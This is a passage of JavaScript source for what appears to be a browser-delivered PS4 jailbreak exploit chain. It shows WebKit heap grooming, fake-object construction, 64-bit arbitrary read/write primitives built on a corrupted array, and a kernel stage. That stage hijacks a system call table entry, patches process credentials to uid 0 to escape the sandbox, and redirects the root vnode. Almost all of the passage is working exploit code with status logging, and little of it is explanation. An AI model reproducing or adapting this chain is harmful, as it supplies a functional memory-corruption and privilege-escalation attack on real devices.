        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
        mark("DONE-THROW", "predecessor-cleared=true");
        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
        setTimeout(function() { mark("SURVIVED-THROW-T1000"); }, 1000);
        scheduleRetry(retrySafe ? "placement-miss" : "load-threw");
        return;
    }

    if (compositionState === 2) {
        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
        mark("DONE-MISS", "predecessor-cleared=true");
        setTimeout(function() { mark("SURVIVED-MISS-T1000"); }, 1000);
        scheduleRetry("clone-miss");
        return;
    }

    if (compositionState === 3) {
        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-carrier-restored=true");
        mark("RW-HEADER-HEX", dumpHex(rwHeader));
        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
        setTimeout(function() { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
        scheduleRetry("header-mismatch");
        return;
    }

    if (compositionState === 0) {
        mark("NO-RESULT", "critical-load-did-not-finish");
        scheduleRetry("no-result");
        return;
    }

    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
    mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
    if (Q.get("hex") === "1" || !RUN_KERNEL_STAGE) {
        mark("RW-HEADER-HEX", dumpHex(rwHeader));
        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
    }

    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
    var writePass = writeObserved && restoreObserved;
    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
    if (readPass) mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
    else mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));

    if (writePass) mark("ARBITRARY-WRITE-PASS", "as-to-as-to-as-restored=true");
    else mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);

    if (readPass && writePass) {
        attemptSucceeded = true;
        mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}

        function markRootsLive() {
            try {
                mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
            } catch (e) {
                mark("ROOTS-LIVE", "err=" + (e && e.message));
            }
            scheduleSurvivalMarks();
        }

        function scheduleKernelStage() {
            compactLog(12);
            setTimeout(function() {
                try {
                    if (KERNEL_LAB) {
                        mark("JAILBREAK-GATE", "klab");
                        setTimeout(runKernelLab, JB_DELAY_MS);
                    } else if (!RUN_JAILBREAK) {
                        mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
                        mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak-or-klab=1");
                    } else {
                        mark("JAILBREAK-GATE", "pause=" + JB_GATE_PAUSE_MS + "-jb-delay=" + JB_DELAY_MS);
                        setTimeout(runJailbreak, JB_DELAY_MS);
                    }
                } catch (e) {
                    mark("JAILBREAK-GATE", "err=" + (e && e.message));
                }
            }, JB_GATE_PAUSE_MS);
        }

        function afterRwPassReady() {
            markRootsLive();
            if (!testRun) {
                testRun = true;
                scheduleKernelStage();
            }
        }

        if (!testRun) {
            if (RUN_KERNEL_STAGE) {
                releasePostRwGroomOnly();
                if (SIMPLE_JB) {
                    setTimeout(afterRwPassReady, 50);
                } else {
                    trimCarrierTailBatched(afterRwPassReady);
                }
            } else {
                if (MEM_DROP_AFTER_RW) releasePreJailbreakMemory();
                afterRwPassReady();
            }
        } else {
            markRootsLive();
        }
    } else {
        try {
            mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
        } catch (e) {
            mark("ROOTS-LIVE", "err=" + (e && e.message));
        }
    }

    if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        scheduleRetry("addrof-no-result");
        return;
    }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
        scheduleRetry("addrof-threw");
        return;
    }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0) + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
        scheduleRetry("addrof-fail");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        scheduleRetry("target-addr-fail");
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        scheduleRetry("fake-addr-fail");
        return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
    runGroomAndLoad();
}

function compactLog(keep) {
    var log = document.getElementById("log");
    if (!log) return;
    var max = keep || 96;
    while (log.childNodes.length > max) log.removeChild(log.firstChild);
}

function dropFillerGraphBatched() {
    var graph = fillerGraph;
    fillerGraph = null;
    outerGraph = null;
    if (!graph) return;
    var batch = 4096;
    var idx = 0;
    function step() {
        if (!graph) return;
        var end = Math.min(idx + batch, graph.length);
        for (var i = idx; i < end; i++) graph[i] = null;
        idx = end;
        if (idx < graph.length) setTimeout(step, 0);
        else {
            graph.length = 0;
            graph = null;
            mark("FILLER-FREED", "batched");
        }
    }
    setTimeout(step, 0);
}

function dropCarrierBatched() {
    var carrier = getterCarrier;
    getterCarrier = null;
    if (!carrier) return;
    var batch = 12000;
    var idx = 0;
    function step() {
        if (!carrier) return;
        var end = Math.min(idx + batch, CARRIER_SLOTS);
        for (var i = idx; i < end; i++) {
            try { delete carrier[i]; } catch (_) {}
        }
        idx = end;
        if (idx < CARRIER_SLOTS) setTimeout(step, 20);
        else {
            carrier = null;
            mark("CARRIER-FREED", "slots=" + CARRIER_SLOTS);
        }
    }
    setTimeout(step, 80);
}

function dropFillerGraphImmediate() {
    if (fillerGraph) {
        fillerGraph.length = 0;
        fillerGraph = null;
    }
    outerGraph = null;
}

function trimCarrierTailBatched(done) {
    if (!getterCarrier || CARRIER_SLOTS <= 4) {
        if (done) done(0);
        return;
    }
    var carrier = getterCarrier;
    var idx = 4;
    var batch = 25000;
    var freed = 0;
    function step() {
        var end = Math.min(idx + batch, CARRIER_SLOTS);
        for (var i = idx; i < end; i++) {
            try {
                if (i in carrier) {
                    delete carrier[i];
                    freed++;
                }
            } catch (_) {}
        }
        idx = end;
        if (idx < CARRIER_SLOTS) setTimeout(step, 0);
        else {
            mark("CARRIER-TRIM", "freed=" + freed + "-kept-slots-0-3");
            if (done) done(freed);
        }
    }
    setTimeout(step, 0);
}

function detachCarrierAfterRw() {
    if (!globalFakeArray) return;
    getterCarrier = null;
}

// Groom/filler only — control POC keeps carrier; we drop groom heap only (carrier trim OOMs at gate).

}

// ========== R/W PRIMITIVES ==========
var rwVecSave = new Array(8);

function read64(addr) {
    if (!globalFakeArray) return 0n;
    for (var i = 0; i < 8; i++) rwVecSave[i] = globalFakeArray[0x10 + i];

    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;

    var val = 0n;
    for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);

    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = rwVecSave[i];
    return val;
}

function write64(addr, value) {
    if (!globalFakeArray) return;
    for (var i = 0; i < 8; i++) rwVecSave[i] = globalFakeArray[0x10 + i];

    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;

    var v = BigInt(value);
    for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);

    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = rwVecSave[i];
}

// ========== KERNEL LAB (R/W probe + kbase, no sysent hijack) ==========
function runKernelLab() {
    mark("===== KERNEL-LAB START =====", "fw=" + FW_LABEL);
    mark("KERNEL-LAB-NOTE", "scan-sysent-VA-first-kbase-is-derived-not-assumed");
    clearSurvivalMarks();
    compactLog(40);
    var sysent = fwOffsets.sysent;
    var prison0 = fwOffsets.prison0;

    sampleKernelReads(sysent);

    var hit = findSysent661Absolute(sysent, prison0);
    if (hit) {
        markSysentProbeAt(hit.se, hit.kb);
        var prisonOk = false;
        try {
            var pr = read64(hit.kb + BigInt(prison0));
            prisonOk = kptrBig(pr);
            mark("KERNEL-READ-PRISON0", hex(pr) + "-ok=" + prisonOk);
        } catch (e) {
            mark("KERNEL-READ-PRISON0", "err=" + e.message);
        }
        mark("KBASE-DERIVED", hex(hit.kb) + "-from-se=" + hex(hit.se));
        mark("KERNEL-RW-OK", "sysent661-pattern-at-kernel-VA");
        persistKernelBase(hit.kb);
        mark("KERNEL-LAB-DONE", "kb=0x" + hit.kb.toString(16) + "-next=jb.html?jb=1");
        return;
    }

    markSysentProbeAt(KBASE_DEFAULT + BigInt(sysent), KBASE_DEFAULT);
    var seDefault = KBASE_DEFAULT + BigInt(sysent);
    var nargD = 0n;
    var callD = 0n;
    try {
        nargD = read64(seDefault) & 0xFFFFFFFFn;
        callD = read64(seDefault + 8n);
    } catch (_) {}
    var anyKernelShape = kptrBig(callD) && nargD <= 12n;
    mark("KERNEL-RW-PROBE", "default-se-narg=" + nargD + "-call=" + hex(callD) + "-shape=" + anyKernelShape);
    if (anyKernelShape) {
        var kbGuess = deriveKbaseFromSysentVa(seDefault, sysent);
        mark("KBASE-DERIVED", hex(kbGuess) + "-weak-from-default-se");
        mark("KERNEL-RW-OK", "loose-sysent-shape-at-default-VA-not-slide-verified");
        persistKernelBase(kbGuess);
        mark("KERNEL-LAB-DONE", "weak-kb=0x" + kbGuess.toString(16) + "-try-jb=1-or-check-KERNEL-READ-SAMPLES");
    } else {
        mark("KERNEL-RW-OK", "miss-no-sysent-pattern-kernel-VA-may-not-be-readable-from-webkit-RW");
        mark("KERNEL-LAB-DONE", "compare-KERNEL-READ-SAMPLES-vs-user-host-same=primitive-not-reaching-kernel");
    }
}

// Control POC path: fixed kbase 0xFFFFFFFF80000000, hijack first (Downloads/1350-webkit-test-main).
function runJailbreakSimple(meta) {
    mark("JB-MODE", "control-poc-fixed-kbase");
    clearSurvivalMarks();
    compactLog(32);
    var evf = fwOffsets.evf;
    var prison0 = fwOffsets.prison0;
    var rootvnode = fwOffsets.rootvnode;
    var sysent = fwOffsets.sysent;
    var jmp = firmwareJmpOffset();
    var kbase = KBASE_DEFAULT;
    if (Q.get("kb")) {
        var qkb = kernelBaseFromQuery();
        if (qkb !== null) kbase = qkb;
    }

    try {
        mark("KERNEL-BASE", hex(kbase));

        var sysent_661 = kbase + BigInt(sysent);
        var jmp_rsi = kbase + BigInt(jmp);
        mark("SYSENT-661", hex(sysent_661));
        mark("JMP-RSI", hex(jmp_rsi));

        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
        var sy_call = read64(sysent_661 + 8n);
        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);

        if (Q.get("khij") === "0") {
            mark("SYSENT-HIJACK-SKIP", "khij=0");
            mark("===== JAILBREAK COMPLETE =====", "kernel-rw-only");
            return;
        }

        write64(sysent_661, 2n);
        write64(sysent_661 + 8n, jmp_rsi);
        write64(sysent_661 + 0x2Cn, 1n);
        mark("SYSENT-HIJACKED", "success");

        var proc = kbase + BigInt(evf);
        var sandboxEscaped = false;
        var verifyUid = -1n;
        var verifyGid = -1n;
        var verifyPrison = -1n;
        var dbgMode = Q.get("dbg") === "1";

        function patchAndVerifyUcred(ucred, prisonVal) {
            write64(ucred + 0x04n, 0n);
            write64(ucred + 0x08n, 0n);
            write64(ucred + 0x0Cn, 0n);
            write64(ucred + 0x10n, 1n);
            write64(ucred + 0x30n, prisonVal);
            verifyUid = read64(ucred + 0x04n);
            verifyGid = read64(ucred + 0x08n);
            verifyPrison = read64(ucred + 0x30n);
            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
        }

        var prisonVal = read64(kbase + BigInt(prison0));
        mark("PRISON0", hex(prisonVal));
        var hits = 0;
        for (var i = 0; i < 0x4000; i += 8) {
            try {
                var candidate = read64(proc + BigInt(i));
                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                    hits++;
                    var ucred = read64(proc + BigInt(i - 0x40));
                    if (ucred > 0n && ucred < 0xffffffffffffn) {
                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
                        if (patchAndVerifyUcred(ucred, prisonVal)) {
                            sandboxEscaped = true;
                            mark("SANDBOX-ESCAPE", "success");
                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                        }
                        break;
                    }
                }
            } catch (e) {}
        }
        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");

        if (!sandboxEscaped) {
            var sigStart = proc - 0x4000n;
            var sigEnd = proc + 0x4000n;
            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
                try {
                    var ref = Number(read64(s) & 0xFFFFFFFFn);
                    if (ref < 1 || ref > 0x200) continue;
                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
                    if (ngroups < 1 || ngroups > 0x80) continue;
                    var pr = read64(s + 0x30n);
                    if (pr !== prisonVal) continue;
                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
                    if (patchAndVerifyUcred(s, prisonVal)) {
                        sandboxEscaped = true;
                        mark("UCRED-SIG-FOUND", hex(s));
                        mark("SANDBOX-ESCAPE", "success");
                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                    }
                } catch (e) {}
            }
            if (!sandboxEscaped) mark("SANDBOX-ESCAPE", "FAILED-not-found");
        }

        var rootVerified = false;
        var root = read64(kbase + BigInt(rootvnode));
        if (root > 0n && root < 0xffffffffffffn) {
            var fd = read64(proc + 0x48n);
            write64(fd + 0x10n, root);
            write64(fd + 0x18n, root);
            var fdCheck = read64(fd + 0x10n);
            rootVerified = fdCheck === root;
            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
        } else {
            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
        }

        write64(sysent_661, BigInt(sy_narg));
        write64(sysent_661 + 8n, sy_call);
        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
        mark("SYSENT-RESTORED", "success");
        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified + "-simple=1");
    } catch (error) {
        mark("JAILBREAK-ERROR", error.message);
    }
}

// ========== PS4 JAILBREAK ==========
function runJailbreak() {
    compactLog(8);
    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
    clearSurvivalMarks();

    if (SIMPLE_JB) {
        runJailbreakSimple(null);
        return;
    }

    var evf = fwOffsets.evf;
    var prison0 = fwOffsets.prison0;
    var rootvnode = fwOffsets.rootvnode;
    var sysent = fwOffsets.sysent;
    var jmp = fwOffsets.jmp;
    var allprocOff = fwOffsets.allproc || 0;
    var skipKhij = Q.get("khij") === "0";

    resolveKernelBaseForStage(sysent, prison0, function onKbase(meta) {
        runJailbreakWithKbase(meta);
    });

    function runJailbreakWithKbase(meta) {
    var kbase = meta.kb;
    var kbaseLocated = meta.located;
    var verified = meta.strict || meta.loose;
    var sysent_661, jmp_rsi;
    var sy_narg, sy_call, sy_thrcnt, proc, sandboxEscaped, verifyUid, verifyGid, verifyPrison;
    var dbgMode, prisonVal, hits, scanOff, sigPtr, sigEnd;
    var procCandidates, procCandIdx, procResolved;
    var sysentHijacked = false;
    var allprocList = [];
    var allprocIdx = 0;

    try {
        mark("KERNEL-BASE", hex(kbase) + (kbaseLocated ? (meta.strict ? "-strict" : "-loose") : "-NOT-LOCATED"));
        markSysentProbe(kbase, sysent);
        if (!kbaseLocated) mark("KBASE-WARN", "see-SYSENT-PROBE-set-kb=-or-run-poops-kl_lock-leak");

        sysent_661 = kbase + BigInt(sysent);
        jmp_rsi = kbase + BigInt(jmp);
        mark("SYSENT-661", hex(sysent_661));
        mark("JMP-RSI", hex(jmp_rsi));

        proc = 0n;
        procResolved = false;
        var harvested = harvestKernelPtrsNearHost();
        mark("PROC-HARVEST", "host=" + (isFinite(hostAddress) ? hex(hostAddress) : "na") + "-kptrs=" + harvested.length);
        allprocList = enumerateAllproc(kbase, allprocOff, 320);
        if (fwOffsets.allprocMx && fwOffsets.allprocMx !== allprocOff) {
            var mxList = enumerateAllproc(kbase, fwOffsets.allprocMx, 320);
            for (var mx = 0; mx < mxList.length; mx++) allprocList.push(mxList[mx]);
        }
        mark("ALLPROC-WALK", "count=" + allprocList.length + "-hen=" + (allprocOff ? hex(allprocOff) : "na") + "-mx=" + (fwOffsets.allprocMx ? hex(fwOffsets.allprocMx) : "na"));
        procCandidates = buildProcCandidates(kbase, evf, harvested);
        for (var ap = 0; ap < allprocList.length; ap++) {
            procCandidates.push(allprocList[ap]);
        }
        procCandIdx = 0;
        mark("PROC-CAND", "count=" + procCandidates.length + "-allproc=" + allprocList.length);

        prisonVal = read64(kbase + BigInt(prison0));
        mark("PRISON0", hex(prisonVal));

        sandboxEscaped = false;
        verifyUid = -1n;
        verifyGid = -1n;
        verifyPrison = -1n;
        dbgMode = Q.get("dbg") === "1";
        hits = 0;
        scanOff = 0;
        allprocIdx = 0;

        if (skipKhij) {
            mark("SYSENT-HIJACK-SKIP", "khij=0");
            mark("KERNEL-STAGE-MISS", "kexploit-arm-disabled");
            mark("===== JAILBREAK COMPLETE =====", "userland-rw=OK-khij=0");
            return;
        }
        if (!kbaseLocated && Q.get("forcekhij") !== "1") {
            mark("SYSENT-HIJACK-SKIP", "kbase-not-located-forcekhij=1-to-arm-anyway");
            mark("KERNEL-STAGE-MISS", "kexploit-needs-kbase-from-kl_lock-leak-or-kb=");
            mark("===== JAILBREAK COMPLETE =====", "userland-rw=OK-kexploit=NOT-ARMED");
            return;
        }

        sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
        sy_call = read64(sysent_661 + 8n);
        sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);

        write64(sysent_661, 2n);
        write64(sysent_661 + 8n, jmp_rsi);
        write64(sysent_661 + 0x2Cn, 1n);
        sysentHijacked = true;
        mark("SYSENT-HIJACKED", "success");
    } catch (error) {
        mark("JAILBREAK-ERROR", error.message);
        return;
    }

    function patchAndVerifyUcred(ucred, prisonValIn) {
        write64(ucred + 0x04n, 0n);
        write64(ucred + 0x08n, 0n);
        write64(ucred + 0x0Cn, 0n);
        write64(ucred + 0x10n, 1n);
        write64(ucred + 0x30n, prisonValIn);
        verifyUid = read64(ucred + 0x04n);
        verifyGid = read64(ucred + 0x08n);
        verifyPrison = read64(ucred + 0x30n);
        return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonValIn;
    }

    function restoreSysent() {
        if (!sysentHijacked) return;
        write64(sysent_661, BigInt(sy_narg));
        write64(sysent_661 + 8n, sy_call);
        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
        sysentHijacked = false;
        mark("SYSENT-RESTORED", "success");
    }

    function finalizeJailbreak() {
        try {
            var rootVerified = false;
            if (sandboxEscaped && procResolved && kptrBig(proc)) {
                var root = read64(kbase + BigInt(rootvnode));
                if (root > 0n && root < 0xffffffffffffn) {
                    var fd = read64(proc + 0x48n);
                    if (kptrBig(fd)) {
                        write64(fd + 0x10n, root);
                        write64(fd + 0x18n, root);
                        var fdCheck = read64(fd + 0x10n);
                        rootVerified = fdCheck === root;
                        mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
                        mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
                    } else {
                        mark("ROOT-VNODE-SET", "FAILED-bad-fd");
                    }
                } else {
                    mark("ROOT-VNODE-SET", "FAILED-invalid-root");
                }
            } else {
                mark("ROOT-VNODE-SET", "FAILED-no-curproc");
            }
            restoreSysent();
            if (sandboxEscaped) mark("KERNEL-STAGE-OK", "sandbox-escaped");
            else mark("KERNEL-STAGE-MISS", "no-curproc-allproc-and-marker-miss");
            mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " sandbox=" + sandboxEscaped + "-fs=" + rootVerified + "-userland-rw=OK");
        } catch (error) {
            try { restoreSysent(); } catch (_) {}
            mark("JAILBREAK-ERROR", error.message);
        }
    }

    function beginSigScanOrFinish() {
        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped + "-proc=" + (procResolved ? hex(proc) : "none"));
        if (sandboxEscaped) {
            setTimeout(finalizeJailbreak, 0);
            return;
        }
        if (hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
        if (hits === 0 && !FORCE_UCRED_SIG_SCAN) {
            mark("KSCAN-SIG-SKIP", "no-proc-marker-ksig=1-to-force-wide-scan");
            mark("SANDBOX-ESCAPE", "FAILED-no-proc-fix-kb-or-kbase-leak");
            setTimeout(finalizeJailbreak, 0);
            return;
        }
        if (!procResolved || !kptrBig(proc)) {
            mark("KSCAN-SIG-SKIP", "no-valid-proc-anchor");
            mark("SANDBOX-ESCAPE", "FAILED-no-proc");
            setTimeout(finalizeJailbreak, 0);
            return;
        }
        sigPtr = proc - 0x4000n;
        sigEnd = proc + 0x4000n;
        setTimeout(scanSigChunk, 0);
    }

    function scanSigChunk() {
        try {
            var step = 0x200n;
            var end = sigPtr + step;
            if (end > sigEnd) end = sigEnd;
            for (; sigPtr < end && !sandboxEscaped; sigPtr += 8n) {
                var ref = Number(read64(sigPtr) & 0xFFFFFFFFn);
                if (ref < 1 || ref > 0x200) continue;
                var ngroups = Number(read64(sigPtr + 0x10n) & 0xFFFFFFFFn);
                if (ngroups < 1 || ngroups > 0x80) continue;
                var pr = read64(sigPtr + 0x30n);
                if (pr !== prisonVal) continue;
                if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(sigPtr) + "-ref=" + ref + "-groups=" + ngroups);
                if (patchAndVerifyUcred(sigPtr, prisonVal)) {
                    sandboxEscaped = true;
                    mark("UCRED-SIG-FOUND", hex(sigPtr));
                    mark("SANDBOX-ESCAPE", "success");
                    mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                }
            }
            if (!sandboxEscaped && sigPtr < sigEnd) setTimeout(scanSigChunk, 0);
            else {
                if (!sandboxEscaped) mark("SANDBOX-ESCAPE", "FAILED-not-found");
                setTimeout(finalizeJailbreak, 0);
            }
        } catch (error) {
            try { restoreSysent(); } catch (_) {}
            mark("JAILBREAK-ERROR", error.message);
        }
    }

    function tryDirectUcredOnProc() {
        if (!kptrBig(proc)) return false;
        var ucred = read64(proc + 0x40n);
        if (!kptrBig(ucred)) return false;
        if (read64(ucred + 0x30n) !== prisonVal) return false;
        if (dbgMode) mark("SCAN-HIT", "direct-p-ucred=" + hex(ucred));
        if (patchAndVerifyUcred(ucred, prisonVal)) {
            sandboxEscaped = true;
            mark("SANDBOX-ESCAPE", "success-direct-p-ucred");
            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
            return true;
        }
        return false;
    }

    function advanceProcCandidate() {
        while (procCandIdx < procCandidates.length) {
            proc = procCandidates[procCandIdx++];
            scanOff = 0;
            procResolved = kptrBig(proc);
            mark("PROC-CAND", hex(proc) + "-idx=" + procCandIdx + "/" + procCandidates.length);
            if (procResolved && tryDirectUcredOnProc()) return "escaped";
            if (procResolved) return "scan";
        }
        proc = 0n;
        procResolved = false;
        return "done";
    }

    function scanProcChunk() {
        try {
            if (!procResolved) {
                var adv = advanceProcCandidate();
                if (adv === "escaped") {
                    setTimeout(finalizeJailbreak, 0);
                    return;
                }
                if (adv === "done") {
                    setTimeout(beginSigScanOrFinish, 0);
                    return;
                }
            }
            var end = Math.min(scanOff + 0x100, 0x4000);
            for (; scanOff < end; scanOff += 8) {
                var candidate = read64(proc + BigInt(scanOff));
                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                    hits++;
                    var ucred = read64(proc + BigInt(scanOff - 0x40));
                    if (kptrBig(ucred)) {
                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + scanOff.toString(16) + "-ucred=" + hex(ucred));
                        if (patchAndVerifyUcred(ucred, prisonVal)) {
                            sandboxEscaped = true;
                            mark("SANDBOX-ESCAPE", "success");
                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                        }
                        break;
                    }
                }
            }
            if (sandboxEscaped) {
                setTimeout(finalizeJailbreak, 0);
                return;
            }
            if (scanOff < 0x4000) {
                setTimeout(scanProcChunk, 0);
                return;
            }
            procResolved = false;
            setTimeout(scanProcChunk, 0);
        } catch (error) {
            try { restoreSysent(); } catch (_) {}
            mark("JAILBREAK-ERROR", error.message);
        }
    }

    function tryAllprocEscapeChunk() {
        try {
            if (allprocList.length === 0) {
                setTimeout(startMarkerScan, 0);
                return;
            }
            if (allprocIdx >= allprocList.length) {
                setTimeout(startMarkerScan, 0);
                return;
            }
            mark("ALLPROC-TRY", "idx=" + allprocIdx + "/" + allprocList.length);
            proc = allprocList[allprocIdx++];
            procResolved = true;
            if (tryDirectUcredOnProc()) {
                mark("SANDBOX-ESCAPE", "success-allproc-direct");
                setTimeout(finalizeJailbreak, 0);
                return;
            }
            setTimeout(tryAllprocEscapeChunk, 0);
        } catch (error) {
            try { restoreSysent(); } catch (_) {}
            mark("JAILBREAK-ERROR", error.message);
        }
    }

    function startMarkerScan() {
        compactLog(32);
